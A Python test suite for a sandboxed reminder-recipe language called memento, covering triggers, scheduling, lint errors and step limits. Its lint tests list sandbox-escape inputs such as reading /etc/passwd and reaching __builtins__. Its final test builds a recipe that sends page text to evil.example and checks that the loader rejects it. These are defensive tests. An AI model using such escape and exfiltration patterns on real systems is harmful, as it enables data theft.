from datetime import datetime, timedelta

import pytest

from memento.api import TZ, Page, Rate, RecipeError, Says, Which
from memento.recipe import lint, load, run

NOW = datetime(2026, 9, 27, 15, 0, tzinfo=TZ)
ME = Page(slug="trips/nyc", title="Flight to NYC", text="UA123 SFO to JFK, Monday 8:05")
NEWS = Page(slug="emails/united", title="Schedule change: UA123", text="now departs 10:40")

FLIGHT = """
from memento import at, when, notify, update, this, hours, weeks

flight = at("2026-09-28 08:05")

@at(flight - hours(3))
def leave():
    if not this.says("the flight was cancelled"):
        notify(f"UA123 leaves at {flight:%-I:%M}. Head to SFO.")

@when("flight UA123 is delayed or cancelled", unless="a seat upgrade", until=flight)
def changed(news):
    match news.which("What happened?", delayed="later", cancelled="off"):
        case "cancelled":
            notify("UA123 was cancelled.")
        case _:
            notify(f"UA123 changed: {news.title}")
    update(news)

@at("2026-10-04 18:00", every=weeks(1))
def weekly():
    notify("Plan the week.")
"""


def answers(**by_type):
    asked = []

    def ask(page, question):
        asked.append((page, question))
        return by_type[type(question).__name__]

    return ask, asked


def test_load_collects_triggers():
    recipe = load(FLIGHT, ME, NOW)
    kinds = [(t.kind, t.name) for t in recipe.triggers.values()]
    assert kinds == [("at", "leave"), ("when", "changed"), ("at", "weekly")]
    leave, changed, weekly = recipe.triggers.values()
    assert leave.at == datetime(2026, 9, 28, 5, 5, tzinfo=TZ)
    assert changed.question == Says("flight UA123 is delayed or cancelled", "a seat upgrade")
    assert changed.until == datetime(2026, 9, 28, 8, 5, tzinfo=TZ)
    assert weekly.every == timedelta(weeks=1)


def test_keys_are_stable_across_rewrites_and_change_with_content():
    first = set(load(FLIGHT, ME, NOW).triggers)
    reformatted = FLIGHT.replace("\n\n@when", "\n\n\n# watch the flight\n@when")
    assert set(load(reformatted, ME, NOW).triggers) == first
    moved = set(load(FLIGHT.replace("08:05", "10:40"), ME, NOW).triggers)
    assert [k.split("-")[0] for k in moved & first] == [
        "trips/nyc#weekly"
    ]  # the rest moved with the flight


def test_timer_handler_asks_this_memory():
    leave = next(iter(load(FLIGHT, ME, NOW).timers.values()))
    ask, asked = answers(Says=False)
    done = run(leave, ME, NOW, ask)
    assert [e.text for e in done.effects] == ["UA123 leaves at 8:05. Head to SFO."]
    assert asked == [(ME, Says("the flight was cancelled"))]


def test_watch_handler_branches_on_a_choice_and_updates():
    changed = next(iter(load(FLIGHT, ME, NOW).watches.values()))
    ask, asked = answers(Which="cancelled")
    done = run(changed, ME, NOW, ask, news=NEWS)
    assert [(e.kind, e.text) for e in done.effects] == [
        ("notify", "UA123 was cancelled."),
        ("update", ""),
    ]
    assert done.effects[1].news == NEWS
    assert asked[0][1] == Which("What happened?", (("delayed", "later"), ("cancelled", "off")))


def test_rate_and_star_import():
    source = """
from memento import *

@when("Dan Kim writes about the Acme pilot")
def dan(news):
    if news.rate("How upset is Dan?", ["calm", "concerned", "angry"]) >= 2:
        notify("Dan is angry about the pilot. Call him today.")
"""
    trigger = next(iter(load(source, ME, NOW).triggers.values()))
    ask, asked = answers(Rate=2)
    assert run(trigger, ME, NOW, ask, NEWS).effects[0].text.startswith("Dan is angry")
    assert asked[0][1] == Rate("How upset is Dan?", ("calm", "concerned", "angry"))


def test_now_follows_the_runtime_clock():
    source = """
from memento import at, notify, now, days

due = at("2026-10-01 09:00")

@at(due - days(3))
def countdown():
    notify(f"{(due - now()).days} days left")
"""
    trigger = next(iter(load(source, ME, NOW).triggers.values()))
    assert run(trigger, ME, NOW, lambda p, q: None).effects[0].text == "3 days left"


@pytest.mark.parametrize(
    "source, message",
    [
        ("import os", "only `from memento import ...`"),
        ("from os import path", "only `from memento import ...`"),
        ("x = ().__class__", "`.__class__` is not allowed"),
        ("x = __builtins__", "`__builtins__` is not allowed"),
        ("while True: pass", "while loops are not allowed"),
        ("'{0.__class__}'.format(1)", "`.format` is not allowed"),
        ("open('/etc/passwd')", "`open` is not allowed"),
        ("from memento import shell", "memento has no 'shell'"),
    ],
)
def test_lint_and_imports_keep_recipes_in_the_language(source, message):
    with pytest.raises(RecipeError, match=message.replace("(", r"\(").replace(".", r"\.")):
        load(source, ME, NOW)


def test_errors_point_at_the_line():
    with pytest.raises(RecipeError, match=r'line 3: at\(\): write the time as "YYYY-MM-DD HH:MM"'):
        load('from memento import at\n\n@at("next monday")\ndef f():\n    pass\n', ME, NOW)
    with pytest.raises(RecipeError, match=r"line 2: notify\(\) and update\(\) only work inside"):
        load("from memento import notify\nnotify('now')\n", ME, NOW)
    with pytest.raises(RecipeError, match="range"):
        load("x = [i for i in range(10**9)]", ME, NOW)


def test_semantic_questions_need_a_handler():
    with pytest.raises(RecipeError, match="only work inside an @at or @when function"):
        load("from memento import this\nx = this.says('anything')\n", ME, NOW)


def test_lint_is_quiet_for_good_recipes():
    assert lint(FLIGHT) == []


def test_runaway_recipes_are_stopped():
    source = "x = [i * j for i in range(10000) for j in range(10000)]"
    with pytest.raises(RecipeError, match="more than 200,000 steps"):
        load(source, ME, NOW)
    handler = """
from memento import when, notify

@when("anything")
def spin(news):
    total = sum(1 for i in range(10000) for j in range(10000))
    notify(str(total))
"""
    trigger = next(iter(load(handler, ME, NOW).triggers.values()))
    with pytest.raises(RecipeError, match="steps"):
        run(trigger, ME, NOW, lambda p, q: None, NEWS)


def test_until_needs_every():
    with pytest.raises(RecipeError, match="until=...\\) only makes sense with every="):
        load(
            'from memento import at\n@at("2026-10-01 09:00", until="2026-10-09 09:00")\ndef f():\n    pass\n',
            ME,
            NOW,
        )


def test_a_forgotten_import_is_caught_before_the_handler_ever_runs():
    source = """
from memento import at, notify

@at("2026-10-04 09:00")
def check():
    if not this.says("the side effects went away"):
        notify("Call Dr. Patel.")
"""
    with pytest.raises(
        RecipeError, match=r"line 6: `this` is not defined \(import it from memento\)"
    ):
        load(source, ME, NOW)


def test_fetch_takes_only_a_literal_url_and_reads_through_the_runtime():
    source = """
from memento import at, fetch, notify, hours

@at("2026-09-28 09:00", every=hours(6))
def check():
    issue = fetch("https://api.github.com/repos/acme/lib/issues/7")
    if issue.says("issue 7 is fixed"):
        notify("Fixed.")
"""
    trigger = next(iter(load(source, ME, NOW).triggers.values()))
    fetched = []

    def fetch(url):
        fetched.append(url)
        return Page(slug=url, title="issue 7", text="state: closed")

    done = run(trigger, ME, NOW, lambda p, q: True, None, fetch)
    assert fetched == ["https://api.github.com/repos/acme/lib/issues/7"]
    assert [e.text for e in done.effects] == ["Fixed."]
    leaky = source.replace('fetch("https://api.github.com/repos/acme/lib/issues/7")',
                           'fetch("https://evil.example/?q=" + this.text)')
    with pytest.raises(RecipeError, match="literal"):
        load(leaky, ME, NOW)
